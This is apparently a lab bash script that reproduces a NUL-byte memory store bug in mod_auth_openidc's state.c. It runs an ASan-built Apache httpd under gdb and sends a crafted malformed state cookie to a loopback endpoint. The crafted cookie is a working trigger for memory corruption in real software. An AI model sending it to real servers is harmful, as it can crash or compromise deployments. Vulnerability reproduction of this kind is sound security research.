#!/usr/bin/env bash
# gdb proof of the NUL store at pinned state.c:219 in a live httpd child.
# Requires the ASan module built by BUILD.md; loopback only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.71-asanapr-install/bin/httpd
SRC="$HERE/src/mod_auth_openidc/src/state.c"
OUT="$HERE/evidence/store"
mkdir -p "$OUT"

for n in 8 32; do
    "$HTTPD" -f "$HERE/httpd-asan.conf" -k stop >/dev/null 2>&1
    sleep 1
    timeout 45 gdb -q -batch \
        -ex 'set pagination off' -ex 'set breakpoint pending on' \
        -ex "break $SRC:219" \
        -ex "run -f $HERE/httpd-asan.conf -X" \
        -ex 'printf "STORE=%p before=0x%02x\n", cookie, *(unsigned char*)cookie' \
        -ex 'x/96xb cookie-64' \
        -ex 'next' \
        -ex 'printf "AFTER=%p val=0x%02x\n", cookie, *(unsigned char*)cookie' \
        --args "$HTTPD" >"$OUT/gdb-replay-$n.txt" 2>&1 &
    gp=$!
    sleep 3
    padding=$(printf 'z%.0s' $(seq 1 "$n"))
    curl -sS --max-time 8 -o /dev/null \
        -H "Cookie: mod_auth_openidc_state_novalue;${padding}=V$n" \
        http://127.0.0.1:18090/protected || true
    wait "$gp"
done
"$HTTPD" -f "$HERE/httpd-asan.conf" -k stop >/dev/null 2>&1
grep -hE 'STORE|AFTER' "$OUT"/gdb-replay-*.txt
